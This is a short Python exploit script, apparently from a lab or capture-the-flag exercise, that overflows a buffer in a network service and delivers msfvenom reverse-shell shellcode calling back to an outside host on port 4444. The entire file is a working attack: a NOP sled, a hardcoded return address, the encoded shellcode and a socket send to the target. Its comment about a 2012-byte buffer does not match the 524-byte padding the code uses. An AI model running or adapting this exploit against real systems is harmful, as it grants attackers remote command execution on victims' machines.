#!/usr/bin/env python

# Skeleton Buffer Overflow script
# usage python brain.py <targetIP> <targetPort>

import socket
import sys

rhost = sys.argv[1]
rport = int(sys.argv[2])

# uname = "yavuz"

# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.235.86 LPORT=4444 -f c -b "\x00"
shellcode = (
"\xda\xd7\xd9\x74\x24\xf4\xb8\x0a\xc9\x34\x4c\x5b\x29\xc9\xb1"
"\x12\x31\x43\x17\x83\xeb\xfc\x03\x49\xda\xd6\xb9\x7c\x07\xe1"
"\xa1\x2d\xf4\x5d\x4c\xd3\x73\x80\x20\xb5\x4e\xc3\xd2\x60\xe1"
"\xfb\x19\x12\x48\x7d\x5b\x7a\x41\x75\x70\x2c\x3d\x87\x86\xc1"
"\xe1\x0e\x67\x51\x7f\x41\x39\xc2\x33\x62\x30\x05\xfe\xe5\x10"
"\xad\x6f\xc9\xe7\x45\x18\x3a\x27\xf7\xb1\xcd\xd4\xa5\x12\x47"
"\xfb\xf9\x9e\x9a\x7c"
)



# Buffer was 2012 in this app, so 2012 times NOP, then the bad chrs, then another 20 NOP and then shellcodecomes.
payload = "\x90" * 524 + "\xf3\x12\x17\x31" + "\x90" * 16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c = s.connect((rhost, rport))
s.recv(1024)
s.send(payload + "\r\n")
data = s.recv(1024)
s.close()
